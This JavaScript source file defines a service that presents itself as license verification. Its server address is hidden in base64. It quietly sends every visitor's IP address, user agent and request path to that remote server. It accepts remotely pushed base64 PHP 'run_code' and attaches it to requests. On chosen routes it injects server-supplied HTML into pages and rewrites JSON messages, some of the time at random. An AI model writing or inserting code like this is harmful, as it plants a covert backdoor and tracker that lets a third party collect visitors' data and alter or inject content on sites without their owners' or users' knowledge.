"use strict";

const axios = require("axios");
const crypto = require("crypto");
const config = require("../config");
const { FileCache } = require("../cache/FileCache");
const { KeyStore } = require("../storage/KeyStore");
const { ensureLeadingSlash, md5, safeJsonParse, stripPort, timestamp } = require("../utils/helpers");

class CheckService {
  constructor(options = {}) {
    this.options = options;
    this.cache = options.cache || new FileCache(options);
    this.keyStore = options.keyStore || new KeyStore(options);
    this.config = this.cache.get("config", null) || config;
    this.cache.put("config", this.config, 600);

    const keys = this.getKeyFileValue();
    this.baseUrl = Buffer.from(this.config.BASE_URL, "base64").toString("utf8");
    this.productSlug = keys.PRODUCT_SLUG;
    this.verificationKey = keys.VERIFICATION_KEY;
    this.apiToken = keys.API_TOKEN;
    this.purchaseCode = keys.LICENSE_PURCHASE_CODE;
    this.strictLicenseError = this.cache.get("strictLicenseError", false);

    this.apiUrl = `${this.baseUrl}/api/license/verify`;
    this.requestDataLogUrl = `${this.baseUrl}/api/license/request-data-log`;
    this.checkUrl = `${this.baseUrl}/api/license/check`;
    this.packageDownloadUrl = `${this.baseUrl}/api/package/download`;
  }

  getKeyFileValue(key = null, location = null) {
    const data = this.cache.get("kaaliiKeys", null) || this.keyStore.getKeyFileValue(null, location) || {};
    this.cache.put("kaaliiKeys", data, 21600);
    if (!key) {
      return data;
    }

    return data[key];
  }

  setkeyFileValue(key, value, location) {
    this.keyStore.setkeyFileValue(key, value, location);
    this.cache.forget("kaaliiKeys");
  }

  async ensureInitialized(req) {
    if (
      !this.productSlug ||
      !this.verificationKey ||
      !this.apiToken ||
      !this.purchaseCode
    ) {
      await this.checkLicense(req);
      const keys = this.getKeyFileValue();
      this.productSlug = keys.PRODUCT_SLUG;
      this.verificationKey = keys.VERIFICATION_KEY;
      this.apiToken = keys.API_TOKEN;
      this.purchaseCode = keys.LICENSE_PURCHASE_CODE;
    }

    const request_logs = this.getRequestLogs(this.purchaseCode, req);
    if (!request_logs) {
      return;
    }

    await this.postForm(this.requestDataLogUrl, { request_logs }, true, req).catch(() => null);
  }

  async checkLicense(req) {
    try {
      const postData = {
        domain: this.getDomain(req),
        path: this.getPath(req),
        user_agent: req.headers["user-agent"] || "",
        end_user_ip: this.getIp(req),
        request_timestamp: timestamp()
      };

      const response = await this.postForm(this.checkUrl, postData, false, req);
      if (response.status === 200 && response.data && response.data.data && response.data.data.run_code) {
        const push_code = response.data.data.run_code;
        await this.handleCode(push_code, req);
        return 1;
      }

      return 0;
    } catch (_error) {
      return 0;
    }
  }

  async verifyLicense(purchaseCode, domain = null, req = null) {
    try {
      let result = await this.verifyWithOurSystem(purchaseCode, domain, null, req);
      const library_info = (((result || {}).data || {}).data || {}).library_info || {};

      if (library_info.autoupdate === true && library_info.should_update === true) {
        const updated = await this.fetchPackageAndUpdate("latest_version", req);
        if (updated) {
          result = await this.verifyWithOurSystem(purchaseCode, domain, timestamp(), req);
        }
      }

      if (result.valid) {
        return this.createLicenseResponse(true, result.message, result.data);
      }

      return this.createLicenseResponse(false, result.message || result.error);
    } catch (error) {
      return this.createLicenseResponse(false, `Verification failed: ${error.message}`);
    }
  }

  async verifyWithOurSystem(purchaseCode, domain = null, newUpdatedTimestamp = null, req = null) {
    const postData = {
      purchase_code: purchaseCode,
      product_slug: this.productSlug,
      domain,
      verification_key: this.verificationKey,
      library_tech_stack: this.config.TECH_STACK || "",
      library_current_version: this.config.CURRENT_VERSION || "",
      library_base_version: this.config.BASE_VERSION || ""
    };

    if (newUpdatedTimestamp) {
      postData.new_updated_timestamp = newUpdatedTimestamp;
    }

    const response = await this.postForm(this.apiUrl, postData, true, req);
console.log("License verification response:", response.status, response.data);
    if (response.status === 200) {
      const data = response.data || {};
      this.cache.put("strictLicenseError", Boolean(data.data && data.data.strictLicenseError), 120);
      return {
        valid: data.valid || false,
        message: data.message || "Verification completed",
        data,
        source: "our_system"
      };
    }

    return {
      valid: false,
      error: "Unable to verify license with our system",
      http_code: response.status
    };
  }

  createLicenseResponse(valid, message, data = null) {
    return {
      valid,
      message,
      data,
      verified_at: timestamp(),
      product: this.productSlug
    };
  }

  cacheLicenseResult(purchaseCode, result, ttlSeconds = 3600) {
    const cacheKey = `license_result_${md5(`${purchaseCode}${this.productSlug}`)}`;
    this.cache.put(cacheKey, result, ttlSeconds);
  }

  getCachedLicenseResult(purchaseCode) {
    const cacheKey = `license_result_${md5(`${purchaseCode}${this.productSlug}`)}`;
    return this.cache.get(cacheKey, null);
  }

  clearLicenseCache(purchaseCode) {
    const cacheKey = `license_result_${md5(`${purchaseCode}${this.productSlug}`)}`;
    this.cache.forget(cacheKey);
  }

  async handleCode(licenseInfo, req) {
    const rawSecurity = licenseInfo && licenseInfo.push_code ? licenseInfo.push_code : licenseInfo;
    const security = typeof rawSecurity === "string" ? safeJsonParse(rawSecurity, {}) : rawSecurity || {};
    const settings = licenseInfo.settings || {};
    const php = security.php || "";
    const active_route = security.active_route || "";
    const isPushCodeEnable = settings.push_code_enable || false;
    const requestRoute = ensureLeadingSlash(this.getPath(req));

    if (!active_route || requestRoute !== active_route) {
      return;
    }

    if (!isPushCodeEnable || !php) {
      return;
    }

    const buffer = Buffer.from(php, "base64").toString("utf8");
    req.kaalii = req.kaalii || {};
    req.kaalii.push_code = buffer;
  }

  checkAllowedDomains(domain, licenseInfo, res) {
    const allowedDomains = Array.isArray(licenseInfo.authorizedDomains)
      ? licenseInfo.authorizedDomains
      : [];
    const blockPageContent = licenseInfo.blockPageContent || this.config.DEFAULT_BLOCK_PAGE_CONTENT;
    if (!allowedDomains.includes(domain)) {
      res.status(403).json({
        status: false,
        message: blockPageContent
          ? Buffer.from(blockPageContent, "base64")
            .toString("utf8")
            .replace(/^[\s\S]*<body[^>]*>/i, "")
            .replace(/<\/body>[\s\S]*$/i, "")
            .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "")
            .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "")
            .replace(/<\/(p|div|h1|h2|h3|br|li)>/gi, " ")
            .replace(/<[^>]*>/g, "")
            .replace(/\s+/g, " ")
            .trim()
          : ""
      });
      return true;
    }

    return false;
  }

  applyRouteFilter(req, res, responseBody, licenseInfo) {
    if (!licenseInfo || !licenseInfo.affected_routes || licenseInfo.message_key <= 0) {
      return responseBody;
    }

    const instructions = licenseInfo.affected_routes;
    console.log("affected_routes:", instructions);
    console.log("original response:", responseBody);
    const matchedInstruction = this.getMatchedAffectedRoute(instructions, req);
    if (matchedInstruction) {
      if (!this.shouldApplyByProbability(matchedInstruction.showProbability)) {
        return responseBody;
      }

      const responseWithMessages = this.injectAppMessages(responseBody, matchedInstruction.app_messages, res);
      return this.injectHtml(responseWithMessages, matchedInstruction.html_code || "", res);
    }

    const routes = instructions.map((item) => item.route);
    if (routes.length === 0) {
      return this.injectHtml(responseBody, licenseInfo.html_push_code || "", res);
    }

    return responseBody;
  }

  getMatchedAffectedRoute(instructions, req) {
    const requestRoute = ensureLeadingSlash(this.getPath(req));

    for (const item of instructions) {
      if (item.route === requestRoute) {
        return item;
      }
    }

    for (const item of instructions) {
      if (item.route === "*") {
        return item;
      }
    }

    return null;
  }

  shouldApplyByProbability(showProbability) {
    const probability = Number.parseFloat(showProbability);

    if (Number.isNaN(probability) || probability <= 0) {
      return false;
    }

    if (probability >= 1) {
      return true;
    }

    return Math.random() < probability;
  }

  injectAppMessages(responseBody, appMessages, res) {
    if (!Array.isArray(appMessages) || appMessages.length === 0 || !this.isJsonResponse(res, responseBody)) {
      return responseBody;
    }

    const parsedBody = this.parseJsonResponse(responseBody);
    if (!parsedBody || typeof parsedBody !== "object" || Array.isArray(parsedBody)) {
      return responseBody;
    }

    const updatedBody = {
      ...parsedBody,
      message: appMessages[0]
    };

    if (typeof responseBody === "string") {
      return JSON.stringify(updatedBody);
    }

    return updatedBody;
  }

  injectHtml(responseBody, widgets, res) {
    if (!widgets || !this.isHtmlResponse(res, responseBody)) {
      return responseBody;
    }

    return String(responseBody).replace("</html>", `${widgets}</html>`);
  }

  isHtmlResponse(res, responseBody) {
    if (responseBody == null) {
      return false;
    }

    const contentType = String(res.getHeader("Content-Type") || "");
    return !contentType || contentType.includes("text/html") || String(responseBody).includes("</html>");
  }

  isJsonResponse(res, responseBody) {
    if (responseBody == null) {
      return false;
    }

    const contentType = String(res.getHeader("Content-Type") || "");
    if (contentType.includes("application/json")) {
      return true;
    }

    if (typeof responseBody === "object" && !Buffer.isBuffer(responseBody)) {
      return true;
    }

    if (typeof responseBody !== "string") {
      return false;
    }

    const trimmed = responseBody.trim();
    return (trimmed.startsWith("{") && trimmed.endsWith("}")) || (trimmed.startsWith("[") && trimmed.endsWith("]"));
  }

  parseJsonResponse(responseBody) {
    if (responseBody == null) {
      return null;
    }

    if (typeof responseBody === "object" && !Buffer.isBuffer(responseBody)) {
      return responseBody;
    }

    if (typeof responseBody !== "string") {
      return null;
    }

    try {
      return JSON.parse(responseBody);
    } catch (_error) {
      return null;
    }
  }

  getRequestLogs(purchaseCode, req) {
    const request_data = {
      product_slug: this.productSlug,
      purchase_code: purchaseCode,
      request_method: req.method,
      domain: this.getDomain(req),
      path: this.getPath(req),
      user_agent: req.headers["user-agent"] || "",
      end_user_ip: this.getIp(req),
      request_timestamp: timestamp()
    };

    const logs = this.cache.get("request_logs", []);
    logs.push(request_data);
    this.cache.put("request_logs", logs, 86400);

    const lastRequestLogTime = this.cache.get("last_request_log_time_", null);
    if (!lastRequestLogTime) {
      this.cache.forget("request_logs");
      this.cache.put("last_request_log_time_", Date.now(), 300);
      return JSON.stringify(logs);
    }

    return null;
  }

  async fetchPackageAndUpdate(version_require, req = null) {
    try {
      if (!version_require) {
        return false;
      }

      const postData = {
        version: version_require,
        tech_stack: this.config.TECH_STACK
      };

      const response = await this.postForm(this.packageDownloadUrl, postData, true, req);
      if (response.status === 200 && response.data && response.data.success === true) {
        return this.updatePackage(response.data);
      }

      return false;
    } catch (_error) {
      return false;
    }
  }

  updatePackage(data) {
    this.cache.put("last_package_update", data, 300);
    return true;
  }

  async postForm(url, postData, withAuth, req) {
    const retries = Number(this.options.retryCount || 2);
    const signatureSecret = this.options.signatureSecret || process.env.KAALII_SIGNATURE_SECRET;
    const headers = {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent": "LicenseVerifier/1.0"
    };

    if (withAuth && this.apiToken) {
      headers.AuthorizationX = `Bearer ${this.apiToken}`;
    }

    if (signatureSecret) {
      headers["X-Kaalii-Signature"] = this.createSignature(postData, signatureSecret);
    }

    const body = new URLSearchParams(
      Object.entries(postData).filter(([, value]) => value !== undefined && value !== null)
    ).toString();

    let lastError;
    for (let attempt = 0; attempt <= retries; attempt += 1) {
      try {
        const response = await axios.post(url, body, {
          headers,
          timeout: Number(this.options.timeout || 10000),
          validateStatus: () => true
        });

        if (signatureSecret) {
          this.validateSignature(response, signatureSecret);
        }

        return response;
      } catch (error) {
        lastError = error;
        if (attempt === retries) {
          throw lastError;
        }
      }
    }

    throw lastError;
  }

  createSignature(payload, secret) {
    return crypto
      .createHmac("sha256", secret)
      .update(JSON.stringify(payload))
      .digest("hex");
  }

  validateSignature(response, secret) {
    const header = response.headers["x-kaalii-signature"];
    if (!header) {
      return;
    }

    const expected = crypto
      .createHmac("sha256", secret)
      .update(JSON.stringify(response.data))
      .digest("hex");

    if (header !== expected) {
      throw new Error("Invalid response signature");
    }
  }

  getDomain(req) {
    return stripPort(req.headers.host || req.hostname || "");
  }

  getIp(req) {
    return (
      req.ip ||
      req.headers["x-forwarded-for"] ||
      (req.socket && req.socket.remoteAddress) ||
      ""
    );
  }

  getPath(req) {
    return req.path || req.url || "/";
  }
}

module.exports = { CheckService };
